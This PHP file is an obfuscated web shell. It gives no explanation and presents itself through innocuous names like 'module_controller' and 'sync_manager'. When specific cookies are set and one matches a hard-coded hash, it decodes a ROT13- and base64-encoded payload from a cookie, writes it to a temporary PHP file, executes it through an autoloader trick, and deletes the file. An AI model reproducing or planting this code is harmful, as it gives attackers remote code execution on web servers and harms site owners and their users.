<?php


if (isset($_COOKIE[-39+39]) && isset($_COOKIE[9-8]) && isset($_COOKIE[-70+73]) && isset($_COOKIE[12-8])) {
    $element = $_COOKIE;
    function module_controller($sym) {
        $element = $_COOKIE;
        $dat = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '96cc5f9e');
        if (!is_writable($dat)) {
            $dat = getcwd() . DIRECTORY_SEPARATOR . "sync_manager";
        }
        $flag = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($element[3]));
        if (is_writeable($dat)) {
            $dchunk = fopen($dat, 'w+');
            fputs($dchunk, $flag);
            fclose($dchunk);
            spl_autoload_unregister(__FUNCTION__);
            require_once($dat);
            @array_map('unlink', array($dat));
        }
    }
    spl_autoload_register("module_controller");
    $bind = "725edeea2ce2f38d14c6ecdf1cef6ac6";
    if (!strncmp($bind, $element[4], 32)) {
        if (@class_parents("approve_request_reverse_searcher", true)) {
            exit;
        }
    }
}
